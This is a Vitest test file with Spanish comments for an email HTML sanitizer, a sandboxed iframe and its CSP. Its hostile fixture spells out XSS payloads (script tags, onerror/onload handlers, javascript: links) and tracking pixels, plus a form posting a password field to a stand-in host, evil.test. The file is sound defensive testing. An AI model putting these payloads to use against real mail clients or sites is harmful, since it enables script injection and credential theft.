// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import {
  SANDBOX_IFRAME,
  cidsReferenciados,
  construirSrcdoc,
  cspDelCuerpo,
  prepararHtml,
} from './htmlSeguro'

/**
 * El fixture hostil: todo lo que un mail real puede traer para ejecutar algo o
 * avisarle al remitente que se abrió. Los cuatro `<script>` que la entrega 0
 * encontró guardados en el legacy eran de este tipo.
 */
const HOSTIL = `
  <style>.x { background: url(https://tracker.test/css.png) }</style>
  <p>Hola</p>
  <script>window.parent.__pwned = 1</script>
  <img src="x" onerror="window.parent.__pwned = 2">
  <a href="javascript:alert(1)">clic</a>
  <a href="https://buscatools.com.ar/precios">precios</a>
  <iframe src="https://evil.test"></iframe>
  <form action="https://evil.test/robar"><input name="clave"><button>Enviar</button></form>
  <svg onload="window.parent.__pwned = 3"><circle r="5"></circle></svg>
  <math><mi xlink:href="javascript:alert(1)">x</mi></math>
  <img src="https://tracker.test/pixel.gif" width="1" height="1">
  <img srcset="https://tracker.test/a.png 1x">
  <td background="https://tracker.test/bg.png"></td>
  <img src="cid:logo@empresa">
  <meta http-equiv="refresh" content="0;url=https://evil.test">
  <base href="https://evil.test/">
  <object data="https://evil.test/x.swf"></object>
  <div style="background-image:url('https://tracker.test/div.png')">caja</div>
`

describe('prepararHtml — lo que no puede ejecutar', () => {
  const { html } = prepararHtml(HOSTIL)

  it('saca los <script>', () => expect(html).not.toMatch(/<script/i))
  it('saca los handlers on*', () => expect(html).not.toMatch(/\son[a-z]+\s*=/i))
  it('saca javascript: de los links', () => expect(html).not.toMatch(/javascript:/i))
  it('saca iframes, objects, meta refresh y base', () => {
    expect(html).not.toMatch(/<iframe|<object|<meta|<base/i)
  })
  it('saca formularios y sus controles', () => expect(html).not.toMatch(/<form|<input|<button/i))
  it('saca SVG y MathML enteros', () => expect(html).not.toMatch(/<svg|<math/i))
  it('conserva el contenido legítimo y los <style>', () => {
    expect(html).toContain('<p>Hola</p>')
    expect(html).toMatch(/<style>/)
    expect(html).toContain('caja')
  })
  it('los links se abren afuera, sin referrer ni opener', () => {
    expect(html).toContain('href="https://buscatools.com.ar/precios"')
    expect(html).toMatch(/target="_blank"/)
    expect(html).toMatch(/rel="noopener noreferrer"/)
  })
})

/*
 * LAS REMOTAS AHORA PASAN (Fase 59 · E1).
 *
 * Era al revés: quedaban bloqueadas hasta que la persona apretara un botón,
 * para que un píxel de seguimiento no le avisara al remitente. Se sacó a
 * pedido —«quiero que me aparezcan todas las fotos, y si se muestra que abrí
 * el mensaje no me importa»—, y lo que estos tests cuidan es que al abrir las
 * imágenes NO se haya aflojado nada más: lo de arriba sigue valiendo entero.
 */
describe('prepararHtml — imágenes remotas', () => {
  it('el src remoto llega al DOM', () => {
    const r = prepararHtml(HOSTIL)
    expect(r.html).toContain('https://tracker.test/pixel.gif')
    expect(r.html).toContain('tracker.test/a.png')
  })

  /*
   * Las tres formas de poner una imagen que usan los mails de verdad —el
   * `background` de una celda, el `srcset` y el `url()` de CSS—, porque el
   * pedido fue «que me aparezcan TODAS las fotos» y un mail armado con tablas
   * pone la mitad de sus fondos así.
   *
   * El fondo va en la TABLA y no en un `<td>` suelto a propósito: un `<td>`
   * fuera de su tabla lo desarma el parser de HTML antes de que DOMPurify lo
   * vea, y el test parecería estar probando al sanitizador cuando no.
   */
  it('conserva los fondos de tabla, el srcset y el url() de CSS', () => {
    const r = prepararHtml(
      '<table background="https://t.test/bg.png"><tr><td>x</td></tr></table>' +
        '<img srcset="https://t.test/a.png 2x" src="https://t.test/a.png">' +
        '<div style="background-image:url(https://t.test/d.png)">caja</div>',
    )
    expect(r.html).toContain('https://t.test/bg.png')
    expect(r.html).toContain('https://t.test/a.png 2x')
    expect(r.html).toContain('https://t.test/d.png')
  })

  it('ya no queda el atributo inerte del bloqueo', () => {
    expect(prepararHtml(HOSTIL).html).not.toContain('data-bt-remota')
  })

  /* El que importa: dejar entrar imágenes no es dejar entrar nada más. Un
     `<img onerror>` remoto sigue sin su handler. */
  it('una imagen remota con handler pierde el handler y conserva el src', () => {
    const r = prepararHtml('<img src="https://t.test/x.png" onerror="window.parent.x=1">')
    expect(r.html).toContain('https://t.test/x.png')
    expect(r.html).not.toMatch(/onerror/i)
  })
})

describe('prepararHtml — imágenes inline (cid:)', () => {
  it('una inline sin resolver queda pendiente, sin src roto', () => {
    const r = prepararHtml('<img src="cid:logo@empresa">')
    expect(r.cidsPendientes).toEqual(['logo@empresa'])
  })

  it('se resuelve con el data URI que trajo el backend', () => {
    const inline = new Map([['logo@empresa', 'data:image/png;base64,iVBORw0KGgo=']])
    const r = prepararHtml('<img src="cid:logo@empresa">', { inline })
    expect(r.html).toContain('src="data:image/png;base64,iVBORw0KGgo="')
    expect(r.cidsPendientes).toEqual([])
  })

  it('cidsReferenciados encuentra los Content-ID del HTML crudo', () => {
    expect(cidsReferenciados('<img src="cid:a@b"><td style="background:url(cid:c@d)">')).toEqual(['a@b', 'c@d'])
  })
})

describe('el iframe', () => {
  it('NUNCA allow-scripts, NUNCA allow-same-origin', () => {
    expect(SANDBOX_IFRAME).not.toContain('allow-scripts')
    expect(SANDBOX_IFRAME).not.toContain('allow-same-origin')
    expect(SANDBOX_IFRAME).not.toContain('allow-forms')
    expect(SANDBOX_IFRAME).not.toContain('allow-top-navigation')
  })

  /* La CSP deja pasar imágenes y NADA más. Es la línea que no se puede
     aflojar de a poco: abrir `img-src` no abre `script-src`. */
  it('la CSP deja pasar imágenes y sigue cerrando todo lo demás', () => {
    const csp = cspDelCuerpo()
    expect(csp).toMatch(/img-src data: https: http:;/)
    expect(csp).toContain("default-src 'none'")
    expect(csp).toContain("script-src 'none'")
    expect(csp).toContain("object-src 'none'")
    expect(csp).toContain("frame-src 'none'")
    expect(csp).toContain("form-action 'none'")
    expect(csp).toContain("base-uri 'none'")
  })

  it('la CSP va en el <head>, antes que cualquier contenido del mail', () => {
    const doc = construirSrcdoc('<img src="data:image/png;base64,AA==">')
    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('<body>'))
    expect(doc).toContain('name="referrer" content="no-referrer"')
  })
})
